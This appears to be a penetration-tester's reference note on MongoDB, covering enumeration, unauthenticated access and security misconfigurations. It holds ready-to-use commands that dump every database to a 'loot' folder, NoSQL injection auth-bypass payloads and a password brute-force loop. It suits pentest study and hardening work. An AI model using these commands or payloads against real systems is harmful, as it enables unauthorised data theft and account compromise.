# MongoDB

#MongoDB #database #nosql #documentstore

## What is MongoDB?
Open-source NoSQL document database. Stores data as BSON (binary JSON) documents. Data organized into databases → collections → documents.

- Port: **TCP 27017** (default instance), **TCP 27018** (shard), **TCP 27019** (config server)
- Config: `/etc/mongod.conf`
- Default bind: `127.0.0.1` (v3.6+), `0.0.0.0` (older)

> [!important] **Auth is still off by default — the localhost bind is the only thing saving it.** Unlike Elasticsearch 8.x, MongoDB has never enabled `security.authorization` by default. Since 3.6 it does bind to `127.0.0.1` only, so a default install isn't network-reachable — but the moment an admin sets `bindIp: 0.0.0.0` (or `bindIpAll`) without also enabling auth, the entire instance is world-readable. That combination is exactly the mass-ransom "MongoDB apocalypse" exposure and is still common on internal networks.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/mongosh\|mongosh]] | Modern client — interactive queries, per-collection dump, JS shell |
| [[Tools/Database/mongodump\|mongodump]] | Full-database BSON exfiltration (cleaner than a `find()` loop) |
| [[Tools/Database/NoSQLMap\|NoSQLMap]] | Automated NoSQL injection + credential brute against web apps and the DB |
| [[Tools/Scanning/NMAP\|Nmap]] | `mongodb-info`/`mongodb-databases` NSE — fingerprint + unauthenticated enum |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `mongodb_login` brute, JS-inject collection enum |
| [[Tools/Web/Burpsuite\|Burp Suite]] | Mutate JSON params to `$gt`/`$ne`/`$regex` for NoSQL auth bypass |

---

## Enumeration

```bash
# Nmap
nmap -p 27017 --script mongodb-info,mongodb-databases -sV <target>

# Check if unauthenticated
mongosh --host <target> --eval "db.adminCommand({listDatabases:1})"

# Metasploit
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/gather/mongodb_js_inject_collection_enum
```

---

## Connect / Access

```bash
# mongosh (modern client)
mongosh "mongodb://<target>:27017"
mongosh "mongodb://<user>:<pass>@<target>:27017/<database>"

# Legacy mongo client
mongo --host <target> --port 27017
mongo --host <target> -u <user> -p <pass> --authenticationDatabase admin

# Connect to specific database
mongosh "mongodb://<target>/admin"
```

---

## Key Commands

```javascript
// Show all databases
show dbs
db.adminCommand({ listDatabases: 1 })

// Switch database
use <database>

// Show collections in current db
show collections
db.getCollectionNames()

// Query all documents in collection
db.<collection>.find()
db.<collection>.find().pretty()

// Query with filter
db.<collection>.find({ "username": "admin" })
db.<collection>.findOne({ "role": "admin" })

// Count documents
db.<collection>.countDocuments()

// List users
use admin
db.system.users.find()
db.getUsers()

// Server info
db.serverStatus()
db.version()
db.hostInfo()

// List roles
db.getRoles({ showBuiltinRoles: true })
```

---

## Attack Vectors

### Unauthenticated Access

```bash
# Check for open instance
mongosh "mongodb://<target>" --eval "show dbs"

# Dump all data from all databases (interactive iteration)
mongosh "mongodb://<target>" --eval "
db.adminCommand({listDatabases:1}).databases.forEach(function(d){
  var db2 = db.getSiblingDB(d.name);
  db2.getCollectionNames().forEach(function(c){
    print('=== ' + d.name + '.' + c + ' ===');
    db2[c].find().forEach(printjson);
  });
})"

# Cleaner full exfil — mongodump grabs everything to BSON in one shot
mongodump --uri="mongodb://<target>:27017" -o ./loot/
```

### NoSQL Injection (Web Apps)

The web-app injection angle (auth bypass, operator injection, blind extraction) has its own full note — this is the DB-side summary. Full payload matrix and methodology: [[Techniques/NoSQL Injection|NoSQL Injection]].

```javascript
// Authentication bypass
// POST body: {"username": {"$gt": ""}, "password": {"$gt": ""}}
// URL param: ?user[$ne]=invalid&pass[$ne]=invalid

// Regex-based blind enumeration (extract a value char-by-char)
{"username": {"$regex": "^a"}}

// Server-side JS operator — sandboxed, but usable for boolean/timing oracles
{"$where": "sleep(1000)"}
```

```bash
# NoSQLMap
python nosqlmap.py --attack 1 --uri "http://<target>/login"

# Burp Suite — modify JSON params to use $gt, $ne, $regex operators
```

### Credential Brute Force

```bash
# Metasploit
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Manual
for pass in $(cat passwords.txt); do
  mongosh "mongodb://admin:$pass@<target>/admin" --eval "db.version()" 2>/dev/null && echo "FOUND: $pass"
done
```

### No Built-in Server File Read/RCE (unlike MSSQL)

> [!warning] **Correction — MongoDB gives you data, not the host.** MongoDB has **no** built-in primitive to read files off the `mongod` server or run OS commands (there is no equivalent of MSSQL's `xp_cmdshell`/`OPENROWSET`). In particular, `load("/etc/passwd")` in `mongosh` executes a JavaScript file on the **client** machine running the shell — it does *not* read a file from the database server. Server-side JS (`$where`, `mapReduce`) runs in a **sandbox** with no filesystem/network access. To reach the host you need a separate vector: cracked reused creds → SSH, a MongoDB CVE for the running version, or credentials/secrets found *in the data itself*. Treat MongoDB as a data-exfil target first and foremost.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `security.authorization: enabled` | Unauthenticated access to all data |
| `net.bindIp: 0.0.0.0` | Exposed to network |
| Default port open to internet | Direct enumeration and data access |
| Weak/no admin password | Full db access |
| Running as root | OS-level impact |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (no auth) | `mongosh "mongodb://host:27017"` |
| Connect (auth) | `mongosh "mongodb://user:pass@host/admin"` |
| List databases | `show dbs` |
| List collections | `show collections` |
| Dump collection | `db.collection.find().pretty()` |
| List users | `use admin; db.system.users.find()` |
| Full exfil | `mongodump --uri="mongodb://host:27017" -o ./loot/` |
| Auth bypass (web) | `{"username":{"$ne":null},"password":{"$ne":null}}` |
| Nmap enum | `nmap -p 27017 --script mongodb-info host` |

---

> [!note] **See also** — sibling unauthenticated data store [[Services/Database Services/Elasticsearch|Elasticsearch]] (same "open port → full dump" pattern) and [[Services/Database Services/Redis|Redis]]. Web-app injection methodology: [[Techniques/NoSQL Injection|NoSQL Injection]].

---

*Created: 2026-07-13*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
